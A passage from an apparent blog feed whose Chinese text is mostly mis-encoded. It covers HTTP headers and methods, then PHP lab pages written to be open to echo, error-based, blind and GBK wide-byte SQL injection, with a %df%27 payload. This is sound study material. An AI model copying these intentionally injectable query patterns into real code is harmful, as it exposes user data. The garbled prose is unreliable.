é’ˆå¯¹è¯·æ±‚æŠ¥æ–‡å’Œå“åº”æŠ¥æ–‡çš„å®ä½“éƒ¨åˆ†ä½¿ç”¨çš„é¦–éƒ¨ã€‚è¡¥å……äº†èµ„æºå†…å®¹æ›´æ–°æ—¶é—´ç­‰ä¸å®ä½“æœ‰å…³çš„ä¿¡æ¯ã€‚</p>
<table>
<thead>
<tr>
<th>é¦–éƒ¨å­—æ®µå</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
<td>Allow</td>
<td>å¯æ”¯æŒçš„HTTPæ–¹æ³•</td>
</tr>
<tr>
<td>Content-Encoding</td>
<td>å®ä½“ä¸»ä½“é€‚ç”¨çš„ç¼–ç æ–¹å¼</td>
</tr>
<tr>
<td>Content-Laguage</td>
<td>å®ä½“ä¸»è‹±æ–‡åç§°ä½“çš„è‡ªç„¶è¯­è¨€</td>
</tr>
<tr>
<td>Content-Length</td>
<td>å®ä½“ä¸»ä½“çš„å¤§å°</td>
</tr>
<tr>
<td>Content-Location</td>
<td>æ›¿ä»£å¯¹åº”èµ„æºçš„URI</td>
</tr>
<tr>
<td>Content-MD5</td>
<td>å®ä½“ä¸»ä½“çš„æ‘˜è¦</td>
</tr>
<tr>
<td>Content-Type</td>
<td>å®ä½“ä¸»ä½“çš„åª’ä½“ç±»å‹</td>
</tr>
<tr>
<td>Content-Range</td>
<td>å®ä½“ä¸»ä½“çš„ä½ç½®èŒƒå›´</td>
</tr>
<tr>
<td>Expires</td>
<td>å®ä½“ä¸»ä½“è¿‡æœŸçš„æ—¥æœŸæ—¶é—´</td>
</tr>
<tr>
<td>Last-Modied</td>
<td>èµ„æºæœ€åä¿®æ”¹çš„æ—¥æœŸæ—¶é—´</td>
</tr>
</tbody>
</table>
</li>
</ul>
<h2 id="0x04-HTTPè¯·æ±‚æ–¹æ³•åŠè¿”å›çŠ¶æ€ç çš„ç±»å‹å’Œå«ä¹‰">0x04 HTTPè¯·æ±‚æ–¹æ³•åŠè¿”å›çŠ¶æ€ç çš„ç±»å‹å’Œå«ä¹‰</h2>
<h3 id="HTTPè¯·æ±‚æ–¹æ³•">HTTPè¯·æ±‚æ–¹æ³•</h3>
<p>HTTPè¯·æ±‚æ–¹å¼åˆ†ä¸ºGET ã€POST ã€PUT ã€HEAD ã€DELETE ã€OPTIONS ã€TRACEå’ŒCONNECT å…«ç§ã€‚</p>
<h4 id="GETï¼šè·å–èµ„æº">GETï¼šè·å–èµ„æº</h4>
<p>GET æ–¹æ³•ç”¨æ¥è¯·æ±‚è®¿é—®å·²è¢«URI è¯†åˆ«çš„èµ„æºã€‚æŒ‡å®šçš„èµ„æºç»æœåŠ¡å™¨ç«¯è§£æåè¿”å›å“åº”å†…å®¹ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœè¯·æ±‚çš„èµ„æºæ˜¯æ–‡æœ¬ï¼Œé‚£å°±ä¿æŒåŸæ ·è¿”å›ï¼›å¦‚æœæ˜¯åƒCGIï¼ˆCommon Gateway Interfaceï¼Œé€šç”¨ç½‘å…³æ¥å£ï¼‰é‚£æ ·çš„ç¨‹åºï¼Œåˆ™è¿”å›ç»è¿‡æ‰§è¡Œåçš„è¾“å‡ºç»“æœã€‚ä¾‹å¦‚ï¼š</p>
<p><img src="https://i.loli.net/2019/10/02/tFDO2VuIe3W1i9C.png" alt=""></p>
<h4 id="POSTï¼šä¼ è¾“å®ä½“ä¸»ä½“">POSTï¼šä¼ è¾“å®ä½“ä¸»ä½“</h4>
<p>POST æ–¹æ³•ç”¨æ¥ä¼ è¾“å®ä½“çš„ä¸»ä½“ã€‚<br>
è™½ç„¶ç”¨GET æ–¹æ³•ä¹Ÿå¯ä»¥ä¼ è¾“å®ä½“çš„ä¸»ä½“ï¼Œä½†â¼€èˆ¬ä¸ç”¨GET æ–¹æ³•è¿›è¡Œä¼ è¾“ï¼Œè€Œæ˜¯ç”¨POST æ–¹æ³•ã€‚è™½è¯´POST çš„åŠŸèƒ½ä¸GET å¾ˆç›¸ä¼¼ï¼Œä½†POST çš„ä¸»è¦ç›®çš„å¹¶ä¸æ˜¯è·å–å“åº”çš„ä¸»ä½“å†…å®¹ã€‚ä¾‹å¦‚ï¼š</p>
<p><img src="https://i.loli.net/2019/10/02/yJ7zqt82nVRL3m9.png" alt=""></p>
<h4 id="PUTï¼šä¼ è¾“æ–‡ä»¶">PUTï¼šä¼ è¾“æ–‡ä»¶</h4>
<p>PUT æ–¹æ³•ç”¨æ¥ä¼ è¾“æ–‡ä»¶ã€‚å°±åƒFTPåè®®çš„æ–‡ä»¶ä¸Šä¼ â¼€æ ·ï¼Œè¦æ±‚è¯·æ±‚æŠ¥æ–‡çš„ä¸»é¢˜ä¸­åŒ…å«æ–‡ä»¶å†…å®¹ï¼Œç„¶åä¿å­˜åˆ°è¯·æ±‚URIçš„ä½ç½®ã€‚ä½†æ˜¯ï¼Œé‰´äºHTTP/1.1çš„PUT æ–¹æ³•è‡ªèº«ä¸å¸¦éªŒè¯æœºåˆ¶ï¼Œä»»ä½•â¼ˆéƒ½å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œå­˜åœ¨å®‰å…¨æ€§é—®é¢˜ï¼Œå› æ­¤â¼€èˆ¬çš„Webç½‘ç«™ä¸ä½¿ç”¨è¯¥æ–¹æ³•ã€‚ä¾‹å¦‚ï¼š</p>
<p><img src="https://i.loli.net/2019/10/02/JAEWX7DHf9CdVo2.png" alt=""></p>
<h4 id="HEADï¼šè·å–æŠ¥æ–‡é¦–éƒ¨">HEADï¼šè·å–æŠ¥æ–‡é¦–éƒ¨</h4>
<p>HEAD æ–¹æ³•å’ŒGETæ–¹æ³•â¼€æ ·ï¼Œåªæ˜¯ä¸è¿”å›æŠ¥æ–‡ä¸»ä½“éƒ¨åˆ†ã€‚å‹‡äºç¡®è®¤URI çš„æœ‰æ•ˆæ€§åŠèµ„æºæ›´æ–°çš„æ—¥æœŸæ—¶é—´ç­‰ã€‚ä¾‹å¦‚ï¼š</p>
<p><img src="https://i.loli.net/2019/10/02/4SNAxOcVTGEm1ud.png" alt=""></p>
<h4 id="DELETEï¼šåˆ é™¤æ–‡ä»¶">DELETEï¼šåˆ é™¤æ–‡ä»¶</h4>
<p>DELETE æ–¹æ³•ç”¨æ¥åˆ é™¤æ–‡ä»¶ï¼Œæ˜¯ä¸PUT ç›¸åçš„æ–¹æ³•ã€‚DELETEæ–¹æ³•æŒ‰è¯·æ±‚URI åˆ é™¤æŒ‡å®šçš„èµ„æºã€‚ä¾‹å¦‚ï¼š</p>
<p><img src="https://i.loli.net/2019/10/02/2sQ6zCvVKDtNhqB.png" alt=""></p>
<h4 id="OPTIONSï¼šè¯¢é—®æ”¯æŒæ–¹æ³•">OPTIONSï¼šè¯¢é—®æ”¯æŒæ–¹æ³•</h4>
<p>OPTIONSæ–¹æ³•ç”¨æ¥æŸ¥è¯¢é’ˆå¯¹è¯·æ±‚URI æŒ‡å®šçš„èµ„æºæ”¯æŒçš„æ–¹æ³•ã€‚ä¾‹å¦‚ï¼š</p>
<p><img src="https://i.loli.net/2019/10/02/JVylmB8i32jcY1F.png" alt=""></p>
<h4 id="TRACEï¼šè¿½è¸ªè·¯å¾„">TRACEï¼šè¿½è¸ªè·¯å¾„</h4>
<p>TRACEæ–¹æ³•æ˜¯è®© Web æœåŠ¡å™¨ç«¯å°†ä¹‹å‰çš„è¯·æ±‚é€šä¿¡ç¯å›ç»™å®¢æˆ·ç«¯çš„æ–¹æ³•ã€‚<br>
å‘é€è¯·æ±‚æ—¶,åœ¨ Max-Forwards é¦–éƒ¨å­—æ®µä¸­å¡«å…¥æ•°å€¼,æ¯ç»è¿‡ä¸€ä¸ªæœåŠ¡å™¨ç«¯å°±å°†è¯¥æ•°å­—å‡ 1 ,å½“æ•°å€¼åˆšå¥½å‡åˆ° 0 æ—¶,å°±åœæ­¢ç»§ç»­ä¼ è¾“,æœ€åæ¥æ”¶åˆ°è¯·æ±‚çš„æœåŠ¡å™¨ç«¯åˆ™è¿”å›çŠ¶æ€ç  200 OK çš„å“åº”ã€‚<br>
ä½†æ˜¯,TRACE æ–¹æ³•æœ¬æ¥å°±ä¸æ€ä¹ˆå¸¸ç”¨,å†åŠ ä¸Šå®ƒå®¹æ˜“å¼•å‘XST(Cross-Site Tracing,è·¨ç«™è¿½è¸ª) æ”»å‡»,é€šå¸¸å°±æ›´ä¸ä¼šç”¨åˆ°äº†ã€‚</p>
<h4 id="CONNECTï¼šéš§é“åè®®è¿æ¥ä»£ç†">CONNECTï¼šéš§é“åè®®è¿æ¥ä»£ç†</h4>
]]></content>
      <categories>
        <category>webå®‰å…¨</category>
        <category>åŸºç¡€å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>webå®‰å…¨åŸºç¡€</tag>
        <tag>HTTPåè®®</tag>
      </tags>
  </entry>
  <entry>
    <title>Webå®‰å…¨å­¦ä¹ ä¹‹å„ç§æ³¨å…¥ç±»å‹çš„ç¯å¢ƒæ­å»ºå’Œä»£ç ç¼–å†™</title>
    <url>/Web_security/basic_learning/7.%E5%90%84%E7%A7%8D%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E7%9A%84%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%92%8C%E4%BB%A3%E7%A0%81%E7%BC%96%E5%86%99/</url>
    <content><![CDATA[<h1 id="Webå®‰å…¨å­¦ä¹ ä¹‹å„ç§æ³¨å…¥ç±»å‹çš„ç¯å¢ƒæ­å»ºå’Œä»£ç ç¼–å†™">Webå®‰å…¨å­¦ä¹ ä¹‹å„ç§æ³¨å…¥ç±»å‹çš„ç¯å¢ƒæ­å»ºå’Œä»£ç ç¼–å†™</h1>
<ol>
<li>ç¼–å†™å¸¸è§„å›æ˜¾æ³¨å…¥çš„ä»£ç ï¼Œåœ¨ä¹‹å‰æ­å»ºçš„ç¯å¢ƒä¸­æµ‹è¯•æ˜¯å¦æ­£å¸¸ï¼›</li>
<li>ç¼–å†™æŠ¥é”™æ³¨å…¥çš„ä»£ç ï¼Œå¹¶åšç›¸åº”çš„æœåŠ¡å™¨é…ç½®æ¥æ»¡è¶³æ¡ä»¶ï¼Œå¹¶æµ‹è¯•ä»£ç æ˜¯å¦æ­£å¸¸ï¼›</li>
<li>ç¼–å†™ç›²æ³¨çš„ä»£ç ï¼Œåœ¨ä¹‹å‰çš„æ­å»ºç¯å¢ƒä¸­æµ‹è¯•æ˜¯å¦æ­£å¸¸ï¼›</li>
<li>ç¼–å†™å®½å­—èŠ‚æ³¨å…¥çš„ä»£ç ï¼Œå¹¶åšç›¸åº”çš„æœåŠ¡å™¨é…ç½®æ¥æ»¡è¶³æ¡ä»¶ï¼Œå¹¶æµ‹è¯•ä»£ç æ˜¯å¦æ­£å¸¸ã€‚</li>
</ol>
<h2 id="0x01-å›æ˜¾æ³¨å…¥">0x01 å›æ˜¾æ³¨å…¥</h2>
<p>å›æ˜¾æ³¨å…¥ä¸»è¦çš„æ˜¯å°†æŸ¥è¯¢çš„å†…å®¹è¾“å‡ºåˆ°é¡µé¢ä¸Šï¼Œè¿™æ ·æŠ¥é”™æ‰èƒ½å›æ˜¾ä¿¡æ¯ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Test ErrorBased Injections&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/h1&gt;&#x27;</span>;</span><br><span class="line">error_reporting(E_ALL ^ E_DEPRECATED);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Connect database</span></span><br><span class="line">$conn=mysqli_connect(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;******&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!conn)</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;Failed to connect to MySQL:&#x27;</span>.mysqli_error($conn);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;Success to connect to MySQL&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">mysqli_select_db($conn, <span class="string">&#x27;security&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span> (<span class="string">&quot;Unable to connect to the database: security&quot;</span>);</span><br><span class="line">mysqli_query($conn, <span class="string">&#x27;set names utf-8&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $id=$_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// query sql</span></span><br><span class="line"></span><br><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;SQL query:&#x27;</span>.$sql;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">$result=mysqli_query($conn, $sql);</span><br><span class="line">$row=mysqli_fetch_array($result, MYSQLI_BOTH);</span><br><span class="line"><span class="keyword">if</span> ($row)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>.$row[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span>.$row[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191029211759.png" alt=""></p>
<h2 id="0x02-æŠ¥é”™æ³¨å…¥">0x02 æŠ¥é”™æ³¨å…¥</h2>
<p>æŠ¥é”™æ³¨å…¥çš„åŸå› æ˜¯<code>mysql_error</code>è¿™ä¸ªå‡½æ•°å¯¼è‡´çš„ï¼Œä½œç”¨æ˜¯è¿”å›ä¸Šä¸€ä¸ªmysqlæ“ä½œäº§ç”Ÿçš„æ–‡æœ¬é”™è¯¯ä¿¡æ¯ã€‚<br>
æŠ¥é”™æ³¨å…¥çš„å‰æï¼šé¡µé¢ä¸Šæ²¡æœ‰æ˜¾ç¤ºä½ï¼Œä½†æ˜¯æœ‰sqlè¯­å¥æ‰§è¡Œé”™è¯¯ä¿¡æ¯è¾“å‡ºã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Test ErrorBased Injections&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/h1&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Connect database</span></span><br><span class="line">$conn=mysqli_connect(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;******&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!conn)</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;Failed to connect to MySQL:&#x27;</span>.mysqli_error($conn);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;Success to connect to MySQL&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">mysqli_select_db($conn, <span class="string">&#x27;security&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span> (<span class="string">&quot;Unable to connect to the database: security&quot;</span>);</span><br><span class="line">mysqli_query($conn, <span class="string">&#x27;set names utf-8&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $id=$_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// query sql</span></span><br><span class="line"></span><br><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;SQL query:&#x27;</span>.$sql;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">$result=mysqli_query($conn, $sql);</span><br><span class="line">$row=mysqli_fetch_array($result, MYSQLI_BOTH);</span><br><span class="line"><span class="keyword">if</span> ($row)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>.$row[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span>.$row[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    print_r(mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191030091300.png" alt=""></p>
<h2 id="0x03-ç›²æ³¨">0x03 ç›²æ³¨</h2>
<p>ç›²æ³¨å‰æï¼šæ²¡æœ‰æ˜¾ç¤ºä½ï¼Œä¹Ÿæ²¡æœ‰è¾“å‡ºSQLè¯­å¥æ‰§è¡Œé”™è¯¯ï¼Œåªæ˜¾ç¤ºé¡µé¢æ­£å¸¸å’Œä¸æ­£å¸¸ã€‚è¦æœ‰ä¸ªemptyå‡½æ•°æ¥åˆ¤æ–­æ˜¯å¦ä¸ºç©ºï¼Œå¦åˆ™and 1=2ä¹Ÿä¼šæ˜¾ç¤ºæ­£å¸¸é¡µé¢ã€‚</p>
<h3 id="å¸ƒå°”ç›²æ³¨">å¸ƒå°”ç›²æ³¨</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Test Bool-Blind Injections&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/h1&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Connect database</span></span><br><span class="line">$conn=mysqli_connect(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;******&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!conn)</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;Failed to connect to MySQL:&#x27;</span>.mysqli_error($conn);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;Success to connect to MySQL&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">mysqli_select_db($conn, <span class="string">&#x27;security&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span> (<span class="string">&quot;Unable to connect to the database: security&quot;</span>);</span><br><span class="line">mysqli_query($conn, <span class="string">&#x27;set names utf-8&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $id=$_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// query sql</span></span><br><span class="line"></span><br><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;SQL query: &#x27;</span>.$sql;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">$result=mysqli_query($conn, $sql);</span><br><span class="line">$row=mysqli_fetch_array($result, MYSQLI_BOTH);</span><br><span class="line"><span class="keyword">if</span> ($row)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;You are in.........&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191030092410.png" alt=""></p>
<h3 id="æ—¶é—´ç›²æ³¨">æ—¶é—´ç›²æ³¨</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Test Bool-Blind Injections&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/h1&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Connect database</span></span><br><span class="line">$conn=mysqli_connect(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;******&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!conn)</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;Failed to connect to MySQL:&#x27;</span>.mysqli_error($conn);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;Success to connect to MySQL&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">mysqli_select_db($conn, <span class="string">&#x27;security&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span> (<span class="string">&quot;Unable to connect to the database: security&quot;</span>);</span><br><span class="line">mysqli_query($conn, <span class="string">&#x27;set names utf-8&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $id=$_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// query sql</span></span><br><span class="line"></span><br><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;SQL query: &#x27;</span>.$sql;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">$result=mysqli_query($conn, $sql);</span><br><span class="line">$row=mysqli_fetch_array($result, MYSQLI_BOTH);</span><br><span class="line"><span class="keyword">if</span> ($row)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;You are in.........&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;You are in.........&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>å’Œå¸ƒå°”ç›²æ³¨ä¸åŒçš„æ˜¯ï¼Œä¸è®ºæ€ä¹ˆè¾“å…¥ï¼Œå›æ˜¾çš„ä¿¡æ¯éƒ½æ˜¯ç›¸åŒçš„ã€‚</p>
<h2 id="0x04-å®½å­—èŠ‚æ³¨å…¥">0x04 å®½å­—èŠ‚æ³¨å…¥</h2>
<p>å®½å­—èŠ‚å‰ææ˜¯æ•°æ®åº“ä¸­é‡‡ç”¨gbkçš„ç¼–ç æ–¹å¼ã€‚</p>
<p>å¦‚æœå­˜åœ¨å®½å­—èŠ‚æ³¨å…¥ï¼Œæˆ‘ä»¬è¾“å…¥%df%27æ—¶ï¼Œç»è¿‡è½¬è¯‘å˜æˆäº†%df%5c%27ï¼ˆ%5cæ˜¯åæ–œæ \ï¼‰ï¼Œä¹‹ååœ¨æ•°æ®åº“æŸ¥è¯¢å‰ç”±äºä½¿ç”¨äº†GBKå¤šå­—èŠ‚ç¼–ç ï¼Œå³åœ¨æ±‰å­—ç¼–ç èŒƒå›´å†…ä¸¤ä¸ªå­—èŠ‚ä¼šè¢«ç¼–ç ä¸ºä¸€ä¸ªæ±‰å­—ã€‚ç„¶åMySQLæœåŠ¡å™¨ä¼šå¯¹æŸ¥è¯¢è¯­å¥è¿›è¡ŒGBKç¼–ç å³%df%5cè½¬æ¢æˆäº†æ±‰å­—â€œé‹â€ï¼ˆå…·ä½“è§GBKçš„æ±‰å­—ç¼–ç èŒƒå›´è§é™„å½•ï¼‰ï¼Œè€Œå•å¼•å·é€ƒé€¸äº†å‡ºæ¥ï¼Œä»è€Œé€ æˆäº†æ³¨å…¥æ¼æ´ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Test ErrorBased Injections&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/h1&gt;&#x27;</span>;</span><br><span class="line">error_reporting(E_ALL ^ E_DEPRECATED);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Connect database</span></span><br><span class="line">$conn=mysqli_connect(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;*****&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!conn)</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;Failed to connect to MySQL:&#x27;</span>.mysqli_error($conn);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;Success to connect to MySQL&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">mysqli_select_db($conn, <span class="string">&#x27;security&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span> (<span class="string">&quot;Unable to connect to the database: security&quot;</span>);</span><br><span class="line">mysqli_query($conn, <span class="string">&#x27;set names gbk&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $id = addslashes($_GET[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// query sql</span></span><br><span class="line"></span><br><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;SQL query:&#x27;</span>.$sql;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">$result=mysqli_query($conn, $sql);</span><br><span class="line">$row=mysqli_fetch_array($result, MYSQLI_BOTH);</span><br><span class="line"><span class="keyword">if</span> ($row)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your Login 